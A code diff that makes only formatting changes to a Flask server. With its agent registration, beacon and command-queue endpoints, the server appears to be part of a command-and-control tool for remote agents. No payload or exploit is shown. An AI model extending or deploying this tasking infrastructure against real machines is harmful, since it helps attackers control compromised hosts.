@@ -16,6 +16,7 @@ agents = db.agents
 
 map = {}
 
+
 def run():
     app.run(debug=True, host="0.0.0.0")
 
@@ -33,7 +34,7 @@ def strip(data):
             data = data.lstrip("b'")
 
             return data
-        except: 
+        except:
             print("Error stripping POST data")
 
 
@@ -72,7 +73,7 @@ def negotiate():
         key = auth.generate_key(plaintext)
         agents.insert_one({"id": id, "key": key})
 
-        map.update({id:Queue(maxsize = 10)})
+        map.update({id: Queue(maxsize=10)})
 
         print(map)
 
@@ -98,24 +99,26 @@ def beacon():
     id_json = agents.find_one(filter, query)
 
     queue = map.get(id_json["id"])
-    
-    if (queue.qsize() > 0):
+
+    if queue.qsize() > 0:
         return queue.get()
-    else: 
+    else:
         return ""
+
 
 @app.route("/api/client/queue", methods=["POST"])
 def queue():
     json = request.get_json()
-    
+
     queue = map.get(json["id"])
 
     queue.put(json["command"])
 
-    if (queue.full()):
+    if queue.full():
         return "Error"
     else:
         return ""
+
 
 @app.route("/api/client/agents")
 def get():
